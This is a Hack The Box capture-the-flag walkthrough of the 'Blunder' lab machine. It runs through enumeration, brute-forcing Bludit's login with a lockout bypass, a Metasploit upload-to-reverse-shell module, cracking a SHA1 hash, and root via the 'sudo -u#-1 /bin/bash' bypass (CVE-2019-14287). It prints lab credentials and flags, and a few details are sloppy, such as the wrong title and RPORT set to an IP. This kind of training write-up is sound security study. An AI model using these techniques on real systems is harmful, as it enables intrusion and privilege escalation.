---
title: "Hack The Box - Blunder"
date: "Jun 21 2020"
subject: "Hack The Box - Blunder"
keywords: [Blunder, Hack The Box]
subtitle: "Blunder walkthrough"
lang: "en"
titlepage: true
titlepage-color: "1E90FF"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Hack The Box Remote Walktrough

## Introduction

This is a walkthrough of the box Blunder using Metasploit.

### Information about the box 

IP address: 10.10.10.191

OS: Linux 

Difficulty: Easy

Release: May 30 2020
## Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.
This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.
Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.

Server IP Address | Ports Open
------------------|----------------------------------------
10.10.10.191      | **TCP**: 80


### Nmap Scan Results
As shown in the nmap scan, only port 80 is open. 
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 16:51 +08
Stats: 0:10:48 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
Nmap scan report for 10.10.10.191
Host is up (0.39s latency).
Not shown: 65533 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Linux 2.6.32 - 3.1 (90%), Infomir MAG-250 set-top box (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%), Linux 3.7 (90%), Ubiquiti AirOS 5.5.9 (90%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (89%), Linux 2.6.32 - 3.13 (89%), Linux 3.0 - 3.2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   308.21 ms 10.10.14.1
2   425.18 ms 10.10.10.191

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1376.98 seconds

```

### web page

#### source code
when looking through the source code, there is nothing out of the ordinary.

#### nikto scan
nikto scan reveals /admin & /robots.txt is present in the webpage. 
```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.191
+ Target Hostname:    10.10.10.191
+ Target Port:        80
+ Start Time:         2020-06-21 17:09:00 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Retrieved x-powered-by header: Bludit
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ All CGI directories 'found', use '-C none' to test none
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /admin/config.php: PHP Config file may contain database IDs and passwords.
+ /admin/cplogfile.log: DevBB 1.0 final (http://www.mybboard.com) log file is readable remotely. Upgrade to the latest version.
+ /admin/system_footer.php: myphpnuke version 1.8.8_final_7 reveals detailed system information.
+ OSVDB-3233: /admin/admin_phpinfo.php4: Mon Album from http://www.3dsrc.com version 0.6.2d allows remote admin access. This should be protected.
+ OSVDB-5034: /admin/login.php?action=insert&username=test&password=test: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to log in with user 'test' password 'test' to verify.
+ OSVDB-376: /admin/contextAdmin/contextAdmin.html: Tomcat may be configured to let attackers read arbitrary files. Restrict access to /admin.
+ OSVDB-2813: /admin/database/wwForum.mdb: Web Wiz Forums pre 7.5 is vulnerable to Cross-Site Scripting attacks. Default login/pass is Administrator/letmein
+ OSVDB-2922: /admin/wg_user-info.ml: WebGate Web Eye exposes user names and passwords.
+ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect (timeout): Transport endpoint is not connected
+ Scan terminated:  10 error(s) and 14 item(s) reported on remote host
+ End Time:           2020-06-21 19:39:21 (GMT8) (9021 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


      *********************************************************************
      Portions of the server's headers (Apache/2.4.41) are not in
      the Nikto 2.1.6 database or are newer than the known string. Would you like
      to submit this information (*no server specific data*) to CIRT.net
      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? y

+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ The site uses SSL and Expect-CT header is not present.
- Sent updated info to cirt.net -- Thank you!

```
#### dirbuster
Dirbuster is used to see if there are any other directories is left out. 
Indeed, todo.txt is being left out by nikto scan
Therefore, the final 3 directories found are: 
<br />
	1. robots.txt
	<br />
	2. todo.txt
	<br />
	3. /admin
	<br />
````
DirBuster 1.0-RC1 - Report
http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
Report produced on Sun Jun 21 17:23:57 SGT 2020
--------------------------------

http://10.10.10.191:80
--------------------------------
Directories found during testing:

Dirs found with a 403 response:

/icons/
/icons/small/

Dirs found with a 200 response:

/
/admin/
/bl-kernel/
/bl-themes/
/bl-kernel/js/
/bl-kernel/admin/
/bl-kernel/abstract/
/bl-kernel/img/
/bl-themes/blogx/img/
/bl-kernel/ajax/
--------------- omitted --------------- 
/bl-kernel/admin/controllers/settings-general.php
/bl-themes/blogx/css/style.css
/robots.txt
/bl-themes/alternative/css/style.css
/bl-themes/social-network/css/style.css
/bl-kernel/admin/themes/booty/css/bludit.bootstrap.css
/bl-kernel/admin/themes/booty/css/bludit.css
--------------- omitted --------------- 
/bl-kernel/admin/themes/booty/js/jquery-auto-complete.min.js
/bl-kernel/admin/themes/booty/js/jquery.datetimepicker.full.min.js
/todo.txt


--------------------------------

````
#### /robots.txt
robots.txt does not disclose any directories.
<br />
![Image of robot.txt](https://github.com/friend-col/hack-the-box--blunder/blob/master/img/robots.jpg)

#### /todo.txt
todo.txt is a list of things that needs to be completed. 
User *fregus* was noted.
<br />
![Image of todo.txt](https://github.com/friend-col/hack-the-box--blunder/blob/master/img/todo.jpg)

#### /admin
admin webpage is presented with a login page 
<br />
![Image of admin login page](https://github.com/friend-col/hack-the-box--blunder/blob/master/img/admin%20page%20.jpg)

Source code was checked but it does not provide any credentials. 
Next, google is used to find out if there is any default credentials.
A directory was given where it the user's credentials were shown, thus the directory was being searched.  
	``` Name of Directory: /bl-content/databases/ users.php```
As shown in the image, there wasn't anything in the directory. 
![Image of cred_not_found](https://github.com/friend-col/hack-the-box--blunder/blob/master/img/bludit_cred_page_not_found.jpg)

An article shows a script for Bludit Brute Force Bypass. <br />
[link to the article](https://rastating.github.io/bludit-brute-force-mitigation-bypass/)
<br />
## Preperation
#### generating a password list for the script to brute force
 <br />
	A password list is generated using cewl. 
	Cewl is a  ruby app which spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers 

``` 
command: cewl -w wordlist.txt -d 10 -m 1 http://10.10.10.191/ 
- -w wordlist.txt: the password generated by cewl will be written into the wordlist.txt file 
- -d 10: Depth to spider to, the depth in this case is 10
- -m 1: Minimum word length, the minimum word length in this case is 1 
```
<br />
#### Preparing the code for Brute Force 

 <br />
   Host was set to the IP address of the target machine 
   <br />
   Username was set to *fergus*, the username shown in todo.txt
   <br />
   Path of the password file was also set, *wordlist.txt* 
   <br />
   [link to the code](https://github.com/bludit/bludit/pull/1090)
   <br />
``` 
#snippet of the code
host = 'http://10.10.10.191' # IP address of the target machine
login_url = host + '/admin/login' # Target URL
username = 'fergus' # username 
wordlist = open_ressources('/root/htb-blunder/wordlist.txt') # wordlist of the password
```

##### results
   username and password is **fergus:RolandDeschain**
````
    [*] Trying: to
    [*] Trying: the
    [*] Trying: of
    ------- snip omitted -------
    [*] Trying: fictional
    [*] Trying: character
    [*] Trying: RolandDeschain

    ()
    SUCCESS: Password found!
    Use fergus:RolandDeschain to login.
    ()

````
## Gettting User Flag

### Getting Reverse shell

  By searching Bludit on metasploit, we found a module
  <br />
|    Variables   |                Values assigned               |
|:--------------:|:--------------------------------------------:|
| Name of module | exploit/linux/http/bludit_upload_images_exec |
|      RHOST     |                 10.10.10.191                 |
|      RPORT     |                 10.10.10.191                 |
|   BLUDITUSER   |                    fergus                    |
|   BLUDITPASS   |                RolandDeschain                |
|      LHOST     |                     tun0                     |
|      LPORT     |                     4444                     |
|    TARGETURI   |                       /                      |
<br />	       

#### checking the user id
  Based on the id, we are logged in as *www-data* user.
 ```
 www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ id
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
  <br />
 Going back to the databases directory(*/var/www/bludit-3.10.0.a/bl-content/databases/users.php*) to get all the usernames and passwords
   <br />
````
 <?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
   "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
    }
````
Using hashid, it is shown that it is a *SHA1* encryption 
```command: hashid faca404fd5c0a31cf1897b823c695c85cffeb98d```
<br />
**results**
```
Analyzing 'faca404fd5c0a31cf1897b823c695c85cffeb98d'
[+] SHA-1 
[+] Double SHA-1 
[+] RIPEMD-160 
[+] Haval-160 
[+] Tiger-160 
[+] HAS-160 
[+] LinkedIn 
[+] Skein-256(160) 
[+] Skein-512(160)
```
Using an online decryptor, hugo's password is *Password120*
<br />
login to hugo account using the credentials and cd home directory to get the flag 
```
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo
su hugo
Password: Password120
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cd ~	
cd ~
hugo@blunder:~$ cat user.txt
cat user.txt
6eb3f4773e49edbc246dd7238ed6a32a
```

## Privilege Escalation

### Vulnerability Exploited
hugo's sudo rights was checked using the command: sudo -l
<br />
```
Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```
From results, it is shown that hugo is able to execute the command /bin/bash as a sudo user with !root restriction. Therefore, using 
[the sudo bash bypass command:]https://n0w4n.nl/sudo-security-bypass/) sudo -u#-1 /bin/bash.
<br />
This command turn hugo into a root user. Navigate into the root home directory to get the root flag. 
```
root@blunder:/root# id 
id 
uid=0(root) gid=1001(hugo) groups=1001(hugo)
root@blunder:/# cd /root
cd /root
root@blunder:/root# cat root.txt
cat root.txt
ac767b447183a65169c00607a931dc03
```
## Additional Information about the exploit
### sudo bash bypass
#### Description
In Sudo before 1.8.28, an attacker with access to a Runas ALL sudoer account can bypass certain policy blacklists and session PAM modules, and can cause incorrect logging, by invoking sudo with a crafted user ID
<br />
#### CVE ID
CVE-2019-14287
 #### Severity
  CVSS 3.0 score: 8.8 High

### bludit bypass
#### Description
   bl-kernel/security.class.php in Bludit 3.9.2 allows attackers to bypass a brute-force protection mechanism by using many different forged X-Forwarded-For or Client-IP HTTP headers
  <br />
  ####  CVE ID
  CVE-2019-17240
 #### Serverity
   CVSS 3.0 score: 9.8 Critial 

### Directory Traversal Image File Upload 
#### Description
Bludit 3.9.2 allows remote code execution via bl-kernel/ajax/upload-images.php because PHP code can be entered with a .jpg file name, and then this PHP code can write other PHP code to a ../ pathname
#### CVE ID
CVE-2019-16113
#### Serverity
  CVSS 3.0 score: 8.8 High 
